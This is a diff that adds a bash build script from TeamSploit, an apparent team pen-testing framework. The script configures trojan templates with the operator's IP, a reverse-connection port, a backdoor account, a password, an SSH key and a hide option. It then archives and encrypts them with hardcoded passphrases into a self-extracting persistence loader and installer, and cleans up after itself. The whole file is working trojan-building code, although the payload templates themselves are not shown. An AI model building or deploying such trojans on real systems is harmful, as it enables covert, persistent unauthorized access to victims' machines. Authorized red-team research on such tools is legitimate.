@@ -1,0 +1,70 @@
+#!/bin/bash
+#
+#       TeamSploit - Pen Testing With Friends
+#       Copyrighted:  Justin M. Wray (wray.justin@gmail.com)
+#       Special Thanks:  Team ICF (Twitter:@ICFRedTeam)
+#
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU General Public License as published by
+#    the Free Software Foundation, either version 3 of the License, or
+#    (at your option) any later version.
+#
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU General Public License for more details.
+#
+#    You should have received a copy of the GNU General Public License
+#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+source teamsploit.conf
+
+#  Setup Trojan Directories
+cp -R ./.trojans/.persist/ ./.trojans/$TS_TROJAN_PERSIST
+cp -R ./.trojans/.loader/ ./.trojans/$TS_TROJAN_LOADER
+cp -R ./.trojans/.startup/ ./.trojans/$TS_TROJAN_STARTUP
+
+#  Set all trojan fields/config
+TS_TROJAN_PATH_DEL=`echo $TS_TROJAN_PATH | sed -e 's/\//||/g'`
+TS_TROJAN_PASSWD_DEL=`echo $TS_TROJAN_PASSWD | sed -e 's/\//||/g'`
+TS_TROJAN_SSHKEY_DEL=`echo $TS_TROJAN_SSHKEY | sed -e 's/\//||/g'`
+
+sed -i -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/$TS_TROJAN_LOADER/rc.stop
+sed -i -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/$TS_TROJAN_STARTUP/rc.stop
+
+sed -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/.persist.source.exec > ./.trojans/$TS_TROJAN_PERSIST/$TS_TROJAN_PERSIST
+sed -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/.persist.source > ./.trojans/$TS_TROJAN_LOADER/$TS_TROJAN_PERSIST
+sed -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/.persist.source.interactive > ./.trojans/$TS_TROJAN_LOADER/interactive
+sed -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/.loader.source.exec > ./.trojans/$TS_TROJAN_LOADER/$TS_TROJAN_LOADER
+sed -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/.loader.source > ./.trojans/$TS_TROJAN_LOADER'_install'
+sed -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/.startup.source > ./.trojans/$TS_TROJAN_LOADER/$TS_TROJAN_STARTUP
+sed -e 's/#!TS_MY_IP!#/'$TS_MY_IP'/g' -e 's/#!TS_TROJAN_RE_PORT!#/'$TS_TROJAN_RE_PORT'/g' -e 's/#!TS_TROJAN_STARTUP!#/'$TS_TROJAN_STARTUP'/g' -e 's/#!TS_TROJAN_PERSIST!#/'$TS_TROJAN_PERSIST'/g' -e 's/#!TS_TROJAN_LOADER!#/'$TS_TROJAN_LOADER'/g' -e 's/#!TS_TROJAN_PATH!#/'$TS_TROJAN_PATH_DEL'/g' -e "s/#!TS_TROJAN_PASSWD!#/$TS_TROJAN_PASSWD_DEL/g" -e 's/#!TS_TROJAN_ACCOUNT!#/'$TS_TROJAN_ACCOUNT'/g' -e 's/#!TS_TROJAN_SSHKEY!#/'$TS_TROJAN_SSHKEY_DEL'/g' -e 's/#!TS_TROJAN_HIDE!#/'$TS_TROJAN_HIDE'/g' -e 's/||/\//g' ./.trojans/.startup.source.exec > ./.trojans/$TS_TROJAN_STARTUP/$TS_TROJAN_STARTUP
+
+#  Double check permissions
+chmod a+x ./.trojans/$TS_TROJAN_PERSIST/$TS_TROJAN_PERSIST
+chmod a+x ./.trojans/$TS_TROJAN_LOADER/$TS_TROJAN_PERSIST
+chmod a+x ./.trojans/$TS_TROJAN_LOADER/$TS_TROJAN_STARTUP
+chmod a+x ./.trojans/$TS_TROJAN_STARTUP/$TS_TROJAN_STARTUP
+chmod a+x ./.trojans/$TS_TROJAN_LOADER/$TS_TROJAN_LOADER
+chmod a+x ./.trojans/$TS_TROJAN_LOADER'_install'
+
+#  Build trojan and bake into template...
+cd ./.trojans/
+tar -zcf ./$TS_TROJAN_PERSIST.tgz ./$TS_TROJAN_PERSIST/
+cat ./$TS_TROJAN_PERSIST.tgz | base64 | openssl enc -aes-256-cbc -a -salt -pass pass:on_boot >> ./$TS_TROJAN_LOADER/$TS_TROJAN_PERSIST
+cat ./$TS_TROJAN_PERSIST.tgz | base64 | openssl enc -aes-256-cbc -a -salt -pass pass:on_boot >> ./$TS_TROJAN_LOADER/interactive
+cp ./$TS_TROJAN_LOADER/interactive ./$TS_TROJAN_STARTUP/interactive
+cp ./$TS_TROJAN_LOADER/$TS_TROJAN_PERSIST ./$TS_TROJAN_STARTUP/$TS_TROJAN_PERSIST
+tar -zcf ./$TS_TROJAN_STARTUP.tgz ./$TS_TROJAN_STARTUP/
+cat ./$TS_TROJAN_STARTUP.tgz | base64 | openssl enc -aes-256-cbc -a -salt -pass pass:on_kinit >> ./$TS_TROJAN_LOADER/$TS_TROJAN_STARTUP
+tar -zcf ./$TS_TROJAN_LOADER.tgz ./$TS_TROJAN_LOADER/
+cat ./$TS_TROJAN_LOADER.tgz | base64 | openssl enc -aes-256-cbc -a -salt -pass pass:$TS_TROJAN_PASSWORD >> ./$TS_TROJAN_LOADER'_install'
+cd - > /dev/null
+
+#  Cleanup
+rm ./.trojans/$TS_TROJAN_PERSIST.tgz
+rm ./.trojans/$TS_TROJAN_LOADER.tgz
+rm ./.trojans/$TS_TROJAN_STARTUP.tgz
+rm ./.trojans/$TS_TROJAN_PERSIST/ -Rf
+rm ./.trojans/$TS_TROJAN_LOADER/ -Rf
+rm ./.trojans/$TS_TROJAN_STARTUP/ -Rf
